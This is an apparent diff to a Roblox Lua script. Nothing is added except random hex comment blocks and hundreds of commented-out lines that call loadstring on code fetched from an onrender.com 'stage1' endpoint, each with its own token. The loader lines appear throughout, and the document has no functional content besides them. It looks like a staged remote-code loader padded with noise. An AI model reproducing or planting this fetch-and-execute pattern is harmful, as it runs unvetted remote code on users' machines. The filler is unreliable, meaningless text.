+--[[ _326b97355b745efc4c65c8ebf659533f ]]
+--[[ _378b808ac1da219869c564812683d2da ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_289f918bebd2f431", true))()
+--[[ _18541731b110ede705107aa5b32afd79 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f10f425b29f32b32", true))()
+--[[ _ed6f0a1cd31d6436b7c2cf3dcec80a37 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bdf3404dc21ee107", true))()
+--[[ _b4c5a4ffb5d5cef7f8a8efc0f13c2e4f ]]
+--[[ _b3180ffe5e549e139b81bd07200808fc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a72725992a88d7eb", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_198ea52a790d435f", true))()
+--[[ _121204e8d03fa69c7529cec8412c4726 ]]
+--[[ _5a79cca51896f1e4f4d58026aeb1c523 ]]
+--[[ _ef3e1c762f9a6c1fef7cbf70877103dc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9178c8d28b7ea6b4", true))()
+--[[ _5c8242f6082b931bc228a1dd050f25b2 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8f829b5df1f6b7da", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c749feb1c959ffaf", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b5e7dc3da439e544", true))()
+--[[ _9f829ed958f869d66417d62737fc67b0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b8b8332aa956be2c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9730a012c5548968", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a0ede33a23f17bb7", true))()
+--[[ _97544a984c7c903d2d8cc15e3afd4cb6 ]]
+--[[ _fb178dde1d754adf89098b6e18451406 ]]
+--[[ _7ac1727ed9e2729f9e81c4a874259f56 ]]
+--[[ _915e9be64aaf68da3d20c949f8df3ebb ]]
+--[[ _442425c187c9ba0af5800860b9984562 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6495eb568cdc2a61", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e778f7a8ab7c62df", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d65e10db5ec88d88", true))()
+--[[ _e4ee2fad259cc6273a34033627fdbcd4 ]]
+--[[ _dc73061c2d7323fcd362ef70ddc509fd ]]
+--[[ _9e669b33c0fb2a027e9ab83767b12536 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_90c8a028af7b0b2f", true))()
+--[[ _7c0b175f4c17e06b36cbd2e0fcfd9a1b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6aadf64a2b4b6f93", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_64812e60348dc90a", true))()
+--[[ _04f0548f191a0d7baf35cf30e18da9fa ]]
+--[[ _051c7d4c79f259b098ac8803fe663d37 ]]
+--[[ _af601e3ca5edc3bd315a40e3ae4bf91c ]]
+--[[ _02767808ed39c7d412026399720b8220 ]]
+--[[ _115691b14f711e4300a9a4b51b7fea51 ]]
+--[[ _a9573d3491e284b86f92f2ee806e5b65 ]]
+--[[ _24840a137015d3b087e19a247c0341cc ]]
+--[[ _d3e9cf45eef2437a29b799f41d2c7150 ]]
+--[[ _45ce109c7b6e15df218ddbb8bd88c529 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4164a83700949f5f", true))()
+--[[ _9878a38ed8e541f202da7098db2599fe ]]
+--[[ _4438814f1b94f0f9418faf7a017a7353 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6a3b6950bab7d3e0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ae6f37b77a270853", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_baea7a5fd8bba210", true))()
+--[[ _a1b96c58ed3ab3fc95e80c07cef05f1e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fba15cfb51b6f003", true))()
+--[[ _caeeac287ad5a4524a40eca114823e8c ]]
+--[[ _2af5858934a6c3346fda2a2b00fca5c5 ]]
+--[[ _4de7aad9f68d84e6252e6c0d2e40a883 ]]
+--[[ _e8d1ffe843b706a1b173775d1933f4b2 ]]
+--[[ _93c3343297662067283011ea1838f33b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_db725e2d96232625", true))()
+--[[ _9498c0052a95bcfd40f8d23bab7741c4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_562228dd4ac219f3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_575e6874508999b5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b658f4c88e9b5d50", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a67f231f4c962735", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2c25a872c419d93d", true))()
+--[[ _50c794e34778c96d958e3e471f7fdb02 ]]
+--[[ _c72996a8cce283ecae84d748c7a295d8 ]]
+--[[ _e6ffb4154df5728fbff0b10d9424e141 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_573407b1d22a592e", true))()
+--[[ _145cc62ba6415562d514ec6565a83768 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_11640f5612c77b09", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a292fcf18a71403c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ec0db629624d71e4", true))()
+--[[ _cce65fb0bd5bb30301d04d43a02c25d4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_060dc945d58be8b9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ea97f59298d5498d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_98277358b0c1bd04", true))()
+--[[ _5f651a297cd3b1a3abca7ffc80bb6855 ]]
+--[[ _6a0e97202354e80cab64a07dd794c5e1 ]]
+--[[ _17ec700f0bbc1dfec64024b9b76ee4ce ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_aa73dd48d3b9ecc4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2da4b4f1cc95588a", true))()
+--[[ _103c2089a77fdd2315f60b6aa76dc064 ]]
+--[[ _1e126ecf212a27f22a08730a2620c310 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_579a7e66936f2601", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a50f299855f8df39", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fceb75de8485893e", true))()
+--[[ _c3b5a0abe1014cf04e6aff45c3ecdf36 ]]
+--[[ _b8866e789888855669080d7b5da62721 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b2b72ea8b40d3758", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7dc5acc7f5abfe40", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a311b6d1354d452e", true))()
+--[[ _48a1e24122b180bb4c5b8f60d210877b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fb02e1aa7c374c9a", true))()
+--[[ _d6463a0a3eadf8058efdac78fed3e27e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_966d7cc8e214af51", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f7470a027d7d802d", true))()
+--[[ _c17c57be6c026071286ec227b3bb43c9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_50e281218a22f298", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cd9b7dfd89f141c2", true))()
+--[[ _c69ed4ec2750072d87e112e8c15dc20c ]]
+--[[ _2eaecec0282478455fdc7cee883d920a ]]
+--[[ _f2ced83622b04292aa9d552ad7af7407 ]]
+--[[ _c52eec34bcd251394d524254b05c7539 ]]
+--[[ _f2642c17209529f4ca67846a229f941a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a20cb364f0997de3", true))()
+--[[ _666f7216e6dbe8062db3d7b7323488d2 ]]
+--[[ _babc9550eaf1b16c624ac3e49ea78c9a ]]
+--[[ _d9cd7a7f3c001069af922d224fca3ae3 ]]
+--[[ _4c009184dd47749ec114f16631ceb1a4 ]]
+--[[ _2e330f4ec6f400510158c732960912a5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_29f820e46e21b3bd", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ee3c0c813ea33bb3", true))()
+--[[ _0d72248802d207d01a82b732615ef2a8 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f2febc120a6bbf8d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ebb74c794875b3b3", true))()
+--[[ _101af3a183b353074fa6fb82b57db388 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_469d88fd3fa05e61", true))()
+--[[ _f830c932e46fa445aed3a89e721deae4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cfdf7abde891182a", true))()
+--[[ _efa00c7c9328938ca3ba9f459275c373 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d30cf783bb38db38", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6e3c48f7f7f0feb5", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_85025c13b74978c4", true))()
+--[[ _89fe3e2531e8253e40bb685884694e3b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8f374319b60285b8", true))()
+--[[ _741db2694159ff9101fe82dd923056c5 ]]
+--[[ _ac735d7876dc72a5638d0d751e65e426 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a5a76b84f3e115a8", true))()
+--[[ _e6301b5e8473c2af05db398e510f7876 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e6d3a6d423f655f4", true))()
+--[[ _c42a3437e0bd2fb886edd6aad067e4a2 ]]
+--[[ _acffa20fa1eb87f938f71ad29efb283a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e96e2dfd257779cc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_86b563549fe5295f", true))()
+--[[ _e0388f59c5eec57605fa50f34bb4b6e2 ]]
+--[[ _bfe08e7db82b11984e7a1029029f698e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4f06998a189628a9", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8212bf48bac5a357", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7d8c80f054af7221", true))()
+--[[ _40aab0696bfcab28668f56437a0f60de ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b60cad561737fcf1", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_52e16c56954db0a6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a371674d60a8e63a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8ee12fca29ef0639", true))()
+--[[ _7ca1c2473ab758c2b991da0177880fca ]]
+--[[ _ba3817dd4a87cd108eb2ae90226cdaf0 ]]
+--[[ _2a4117eae6792750e2012062a00d1d7c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f97281cb33d3cfd6", true))()
+--[[ _0c723add0cd60acfaa12675cafa966e1 ]]
+--[[ _9b84cfa1308c1926b80def827d0c7b98 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ddf2992769254754", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_dba0969b690059c7", true))()
+--[[ _c7abc713dddb751bfb7ab9c8671c68ef ]]
+--[[ _d613e6ed419611fb10b3fd7e08dae2fc ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_77046f0083e7ce3e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_1a77fffcaf23527e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7b5c55f962ae2b6e", true))()
+--[[ _4e52a6b961b7c9ae42a5718a0ca16d5c ]]
+--[[ _81a842a0e93fae7279c0dc01924e57c8 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d8fa8d019c892a0a", true))()
+--[[ _faa7332b44585254ad956eca18dcf4bf ]]
+--[[ _bc255e1d06ba51a29d72d18722fc6d43 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4a2083ef95cc372e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_95de1ee06485f783", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d7b1734531dfa504", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b2cb5f6c15063743", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_56c4c1e05394044e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ebec541a35bc8496", true))()
+--[[ _964378548105ab2edda74a5e064d621a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8d94711fec2556f3", true))()
+--[[ _01749f7a1b2afcc32041deac368529b5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_90feb017ccf2fbda", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fb0d4015e39ac747", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f5d6e08826dea293", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_987e47da803c72ac", true))()
+--[[ _4e27ee44c5fb2f17a204e99c2b6cc0ca ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f18d1f2191432047", true))()
+--[[ _7c039c7e803fd3a637e431f72dc61210 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c5566883d4cc2a20", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c3ec0722d57a0c7a", true))()
+--[[ _0c76a382a20ff54859336155e3ac6094 ]]
+--[[ _46c8860a185a71fc49ecedfb3449fd76 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6cd573fecaa4ca50", true))()
+--[[ _02774e4899ffafdab74f7aa5f461953a ]]
+--[[ _61938e24054ea0c97c4580e7d7d252b0 ]]
+--[[ _deee3dfce46e38c348dc58ceaeebd7e1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f290349c0b6ed12d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ea6f690d3ea6985c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2da6551de357d04a", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_41d0906d7390c657", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e26d71e8a0f1859b", true))()
+--[[ _e84b9160b91b57d3fa488cc88ceaef12 ]]
+--[[ _9aa24c593c52918ba1cabe3184ce1345 ]]
+--[[ _82776c481b5df3751dbca2568b0362f0 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_42ebd735d4e0f606", true))()
+--[[ _1c1a9bda3b07b6880ac3063e95d2f4cb ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_375bac9fbca58780", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9f7f72956cf192a6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b964d564bffd7fd0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_227547f3b15599ff", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f8560e11d4e9e204", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_939689ea95eb233e", true))()
+--[[ _e58d1e624379d0bbd6025772e6b6b573 ]]
+--[[ _f8985b477883896ca22d23664a247284 ]]
+--[[ _22ae8f1ec0c9c5466d903c06752dc07b ]]
+--[[ _3ba4a02b9d937eb37f2cffdc2eea9474 ]]
+--[[ _e02019779202db573ef215c89ea00471 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3abbb465271fab62", true))()
+--[[ _b9cba05f04197d005c035903c27c2665 ]]
+--[[ _4684998a45d78b92a2d8a7b30f2473dd ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2dee3a0ab0cbd762", true))()
+--[[ _eb69aebbeae101c7f71c4f93b2cc8707 ]]
+--[[ _9a8a29b01b48030abdb03ea4994ef68e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b88c693a231e7892", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d5595f83a1f4bf86", true))()
+--[[ _b43352f9e8c1c0e133e6d5eda687574d ]]
+--[[ _53eeba223647e61bcb2b7d49de01fa6c ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d219683ec578d94e", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_43282829532b4781", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4f0bd667c22262f4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4e87bdf8bcd9e9fc", true))()
+--[[ _cbd4d1c3b32a5d24c67ae647e4b530ba ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c88a117785277c26", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4a60c17eb47cab86", true))()
+--[[ _8936282cb4f2da5a3d5c648fc7c268ac ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_75b5d71b61c99124", true))()
+--[[ _ecd5d101e705e03a7d53e2e8f8f78a1a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_c15854b25ff79532", true))()
+--[[ _13fcfa5b2a1b2deed75c0b203fb7804d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_46d7d1164f47dad3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b45f362a707ebcfe", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_113706d9f2983126", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_96b09739c6f17c9c", true))()
+--[[ _eec458ad756115c9f0764e31dcf4adc6 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7babefdebee0de90", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_ae59abcb86f84633", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_65af99c384990361", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_8fe6b8312580531a", true))()
+--[[ _c3d7130ba2e22c759e576e94f2e5b549 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2d72b17b23930501", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_307e0b852fe203c2", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cf89226c324d2c6d", true))()
+--[[ _4dc84153e36fae0ce5d2e75bb836ea0b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f9f48f51c86ab43d", true))()
+--[[ _d3b8ac932531a00d326c11078ad69caa ]]
+--[[ _62a4df699e85c122bfc978fd2d0a4a8e ]]
+--[[ _a30896882455cce365b8c3fa4ac7689f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f73d1f77cf9dad74", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_f9fc359d4c86f00c", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_480c2ba9b0e42dc6", true))()
+--[[ _0d27245662a247c8d9869f88bf6eb61e ]]
+--[[ _7a637e5ae17963a1ea4c1b436b64ec59 ]]
+--[[ _6a10c2069358ceeb33cd22df06257955 ]]
+--[[ _73eff88f64cf64556169b7684f8ce45f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_715b1848ac5d234d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4901fd367611de1a", true))()
+--[[ _15bbc3c7c4646a872d78dea9c2082dc4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_06b0f991e36c7e4a", true))()
+--[[ _91ef0102518a3a5b44e37b140d8d5b07 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_30f4b7e9a4cb9383", true))()
+--[[ _d8b1ee5ccf04698cdcdda6c3f866484c ]]
+--[[ _581a201db49e7832693197d97b19bd44 ]]
+--[[ _036a03b9afd91cb822e328f963a1bf26 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a021411a7149d674", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_85d51292520b57a9", true))()
+--[[ _23cbdc00ee4d71fa46a048086843831f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_399bca4c112b1d68", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_192f8695f189cfaf", true))()
+--[[ _485d0888687e72f8b6bd4e97c02140c3 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d525e6e7814cfabc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_a1ec3d4b66e9af7f", true))()
+--[[ _624b8892476be9996a25ba49cf7f3c5f ]]
+--[[ _db5057534c1121f01fc27a0996187c89 ]]
+--[[ _de67f56cc59dc041cc07d09643e9949f ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_32af8b585ac60565", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_658a57b2d6bd6f95", true))()
+--[[ _917c02e5cf3af68fb950ef322123b8be ]]
+--[[ _dcaf7a0f589ced3fcfa73feb95a621d9 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_d6c305644e8b91d3", true))()
+--[[ _f1c848cf10887cd6d9a72467c4f7be08 ]]
+--[[ _f2c525cfb625eb365c2fd4b1a8597f5a ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3d270762b5ae9aad", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_75b81cb8643fc829", true))()
+--[[ _91d40ba8c6a5d2ddbaf95ca4e288dc08 ]]
+--[[ _9d90002f440783744f97bf5118cc512b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_7a295d6e957f3c6c", true))()
+--[[ _4e641e9107f11a0dfaa282fe23b731a4 ]]
+--[[ _ed814a16b439c5b221cc5e70450026da ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_60dd490cdbcce096", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_52c20245ff33531b", true))()
+--[[ _1d3427aefb06141c583ef36b273a0771 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_72e698f0f102e6c9", true))()
+--[[ _96dbe3743736aa6d766da5dabc48146c ]]
+--[[ _ccabeb64432164af628a8b62577da107 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_79a61d2ca36adba4", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_68129e3bc2b1911d", true))()
+--[[ _a920961057d9500057fa96320532b4b6 ]]
+--[[ _a731e96fa020e20ccd95ef3996350fd5 ]]
+--[[ _4f58081fc8f050032004d327e4ad4915 ]]
+--[[ _7bbe2a978588d1582b0b0dd009e3c71c ]]
+--[[ _b128e6a61336d389c772ea4c6d566fc0 ]]
+--[[ _cfbdb98d42143990ee4ad635fa50489e ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_07a646a4727e7b45", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e71685c7b7d9e102", true))()
+--[[ _0182d00900e0ad977bbf125bc9ca33a4 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_4f95ae8e88727c6b", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_aca46c3447e6893b", true))()
+--[[ _9406ddedf6a9201448284a13776ca9e1 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cecc92c0e534005f", true))()
+--[[ _aab5cd0fc45c407af456e33570243abf ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_0ccd4414abba3be8", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_99b67be4a4cfc1e3", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_12699ed7651874b6", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_58665b18c9544ffc", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_6a2605b20628c590", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3c8b8a8473635ae5", true))()
+--[[ _7a4033e440487eb3753f2dea18578935 ]]
+--[[ _4d27ec4f10df83978f63a7621681f96a ]]
+--[[ _a03af25e3a694eb4dc4d1151e3c6d87a ]]
+--[[ _cb172052eb250af6a78585548bc9f78d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cc8f43272925b379", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_467f2ee765233e30", true))()
+--[[ _c2601810070c210746a9c2f4ec63220b ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e8fc03503d0cbc7f", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_585dec2351241485", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_bc7e0e9b0df2d29d", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_2cb9818d2903d96f", true))()
+--[[ _01e57c7df86da485a3081c9c6dacc980 ]]
+--[[ _933247554657e069034f6aa3d0a5957d ]]
+--[[ _15ee62ef977b721ac3ecdfc981500abf ]]
+--[[ _717330b64152ed765986b83bc5309042 ]]
+--[[ _e35f3cefb91ba1baedf69f241b3989c7 ]]
+--[[ _76db90f6016413a6c54bd6b6f0824e83 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_cb7003a3969de2a0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_b6c387cf195f83e0", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_9fd609df01eb00ea", true))()
+--[[ _666bd4080ab4bd6bac77c1af5b03a978 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_585bd999f098401c", true))()
+--[[ _409ba0e9041e41cf482e0f70f51472a5 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_3868b543cced9dba", true))()
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_fee0d69d98bebafb", true))()
+--[[ _43088a81f7a881ac36325d685dbd9e12 ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_e08eb542a765bbe3", true))()
+--[[ _dae0ab6a5702a578d5a0e3b348bd9b79 ]]
+--[[ _8930b2df5c72b31b15a762773ce83961 ]]
+--[[ _432f1f28646c2b7ef393d8681adad0f6 ]]
+--[[ _1d3a08bbbfae65210af0a16c93ae3b9d ]]
+--loadstring(game:HttpGet("https://sapien-w76a.onrender.com/stage1?token=_06eb5d488a505ff8", true))()
